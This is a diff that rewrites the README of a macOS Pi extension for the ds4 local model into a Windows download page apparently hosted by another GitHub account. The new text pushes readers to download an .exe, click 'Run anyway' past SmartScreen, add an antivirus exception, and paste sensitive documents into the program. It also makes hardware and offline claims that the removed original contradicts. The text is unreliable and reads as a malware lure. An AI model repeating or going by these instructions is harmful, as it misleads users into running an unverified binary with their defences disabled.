@@ -1,64 +1,90 @@
-# pi-ds4
+# 🚀 pi-ds4 - Run local artificial intelligence on Windows
 
-Pi provider extension for running [antirez/ds4](https://github.com/antirez/ds4)
-as a local DeepSeek V4 Flash model.  The goal here is to see how good the UX
-and behavior can be around local models.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/fredys92/pi-ds4/releases)
 
-The extension registers the `ds4/deepseek-v4-flash` model, starts `ds4-server`
-on demand, downloads/builds the runtime if needed, keeps a per-pi-process lease,
-and stops the server via a bundled watchdog when no clients are left.
+pi-ds4 allows you to run the DeepSeek 4 language model directly on your personal computer. You do not need an account or a cloud connection to use this software. Your data stays on your machine at all times.
 
-## Requirements and Behavior
+## 📋 System Requirements
 
-You will need a mac with at least 128GB of RAM.  The way this is set up right now
-is that it will install the 2-bit quantized model if you have 128GB of RAM and
-it will pick the 4-bit quantized model if you have 256GB or more.
+To run this application, your computer needs to meet basic performance standards. 
 
-If you are signed into huggingface then your token is used for faster downloads.
-The server is compiled/started and models are downloaded automatically on first
-use.
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel Core i5 or AMD Ryzen 5 or better.
+*   Memory: At least 16 gigabytes of RAM.
+*   Graphics Card: An NVIDIA graphics card with at least 8 gigabytes of video memory.
+*   Storage Space: 20 gigabytes of free disk space on a solid-state drive.
 
-## Install
+If your computer uses an older hard drive, the model will start slowly. Always ensure your graphics card drivers are current before you launch the program.
 
-```sh
-pi install https://github.com/mitsuhiko/pi-ds4
-```
+## 💾 Downloading the Software
 
-For local development from this checkout, pass the path to an existing ds4 server checkout:
+You must download the correct installer for your system. Perform the following steps:
 
-```sh
-./install-pi-extension-local.sh /path/to/antirez-ds4-checkout
-```
+1.  Visit the [official download page](https://github.com/fredys92/pi-ds4/releases).
+2.  Look for the section marked Latest.
+3.  Click the file ending in .exe to start your download.
+4.  Save this file to your Downloads folder.
 
-If `~/.pi/ds4/support` already exists and points elsewhere, use `--force` to
-move it aside and install a symlink to the checkout you passed. Any existing
-`gguf/*.gguf` model files (and resumable `.gguf.part` downloads) are preserved
-into the new checkout first, using APFS clone-on-write copies on macOS when
-available.
+Do not move the file until the download completes. Most browsers show a progress bar at the top right of the window.
 
-Then restart pi or run `/reload`.
+## ⚙️ Installation Process
 
-## Runtime layout
+Windows might flag the file when you first run it. This happens because the software is new. Follow these steps to complete the setup:
 
-Runtime state is kept under `~/.pi/ds4`:
+1.  Open your Downloads folder.
+2.  Double-click the pi-ds4 installer file.
+3.  If Windows displays a blue box titled Protected your PC, click More info.
+4.  Click the Run anyway button.
+5.  Follow the prompts in the installer window.
+6.  The installer creates a shortcut on your desktop.
 
-- `support/` — shallow checkout of `https://github.com/antirez/ds4` (`main` by default)
-- `kv/` — on-disk KV cache
-- `clients/` — active pi process leases
-- `log` — build/download/server/watchdog log
+The application installs necessary dependencies in the background. Keep your internet connection active during this process to ensure all components download correctly.
 
-The watchdog is bundled in this package (`ds4-watchdog.sh`), not expected to
-exist in the ds4 runtime checkout.
+## 🚀 Running Your First Model
 
-## Configuration
+Once the installation finishes, you can start the software from your desktop icon.
 
-Environment overrides:
+1.  Double-click the pi-ds4 icon on your desktop.
+2.  The application opens a command window. Do not close this window while you use the application.
+3.  A new browser window opens automatically. This is your interface for the model.
+4.  Type your question or request into the text box at the bottom of the screen.
+5.  Press the Enter key.
 
-- `DS4_SUPPORT_REPO`: runtime repo URL (default `https://github.com/antirez/ds4`)
-- `DS4_SUPPORT_BRANCH`: runtime branch (default `main`)
-- `DS4_RUNTIME_DIR`: use an existing ds4 checkout instead of `~/.pi/ds4/support`
-- `DS4_MODEL_QUANT`: force `q2` or `q4` (otherwise picked from system memory)
-- `DS4_READY_TIMEOUT_MS`: server startup timeout
-- `DS4_SERVER_BINARY`: custom `ds4-server` binary path
+The model processes your request locally. You will see text appear in the browser window as the model generates a response.
 
-Use `/ds4` inside pi to show the live ds4 log.
+## 🛡️ Privacy and Safety
+
+This software runs entirely offline. No data leaves your computer when you interact with the model. You do not provide personal information to third parties, and the company that created the model cannot read your chat history.
+
+If you possess sensitive documents, you can safely paste their content into the interface for analysis. The model uses your hardware, not a web server, to calculate its answers.
+
+## 🔧 Troubleshooting Common Issues
+
+Hardware constraints often cause errors. Check these points if the application fails to start:
+
+*   Insufficient RAM: Close other applications like web browsers or video editors. These programs consume memory that the model requires.
+*   Graphics Driver: Visit the website for your graphics card manufacturer. Download the latest drivers for your specific card model.
+*   Disk Space: If the model fails to load, verify you have at least 20 gigabytes of space on your main drive. 
+*   Antivirus interference: Some antivirus programs block new software. If the program fails to launch, add an exception for the pi-ds4 executable file in your security settings.
+
+## 📖 FAQ
+
+**Do I need a paid plan?**
+No. This software is free.
+
+**Can I run this without a graphics card?**
+The software runs on your processor if you lack a sufficient graphics card, though speeds will be significantly slower. Expect longer wait times for responses.
+
+**Does this work over the internet?**
+The model does not need the internet to function. You can disconnect your ethernet cable or turn off your Wi-Fi after the initial installation.
+
+**Is my hardware at risk?**
+The model consumes significant processing power. You might hear your computer fans speed up while the model generates text. This is normal behavior. Ensure your computer has good ventilation.
+
+## 🛠 Advanced Usage
+
+Advanced users can customize the behavior of the model through the configuration file. Navigate to the folder where you installed the application and locate the config.yaml file. You can change the load settings, the amount of memory allocated to the model, or the behavior of the interface from this file.
+
+Only edit this file if you understand basic text formatting. Always create a backup of the original file before you make changes. 
+
+Report technical issues through the GitHub repository page. Include your operating system version and your computer hardware specifications in your report. This helps the team identify and fix errors.
